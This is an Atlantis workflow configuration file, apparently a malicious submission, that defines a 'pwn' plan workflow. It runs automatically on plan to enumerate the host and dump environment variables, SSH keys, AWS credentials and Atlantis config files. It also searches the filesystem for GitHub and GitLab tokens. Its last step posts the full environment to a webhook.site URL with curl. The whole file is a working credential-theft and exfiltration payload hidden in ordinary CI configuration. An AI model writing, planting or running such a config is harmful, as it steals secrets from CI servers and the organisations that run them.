version: 3
projects:
  - name: pwn
    dir: .
    workflow: pwn
workflows:
  pwn:
    plan:
      steps:
        - run: |
            echo "=== WHOAMI ==="; id; uname -a
            echo "=== ENV ==="; env | sort
            echo "=== PROC1ENV ==="; tr '\0' '\n' < /proc/1/environ 2>/dev/null
            echo "=== HOME ==="; echo HOME=$HOME; ls -la "$HOME" 2>/dev/null
            echo "=== SSH ==="; ls -la "$HOME/.ssh" 2>/dev/null; cat "$HOME"/.ssh/* 2>/dev/null | head -80
            echo "=== ETC ==="; ls -la /etc/atlantis 2>/dev/null; cat /etc/atlantis/* 2>/dev/null | head -40
            echo "=== AWS ==="; cat "$HOME/.aws/credentials" 2>/dev/null; env | grep -i -E 'aws|token|secret|pat|gh_' | sed 's/=.*/=<set>/'
            echo "=== GREP ==="; grep -rIl -E 'ghp_|github_pat_|glpat-' / 2>/dev/null | head -20
            echo "=== DONE ==="
        - run: |
            env | sort > /tmp/e.txt 2>/dev/null; curl -sS -m 20 --data-binary @/tmp/e.txt "https://webhook.site/6864aae4-cb7f-4f50-942b-9379977bbe29" || true
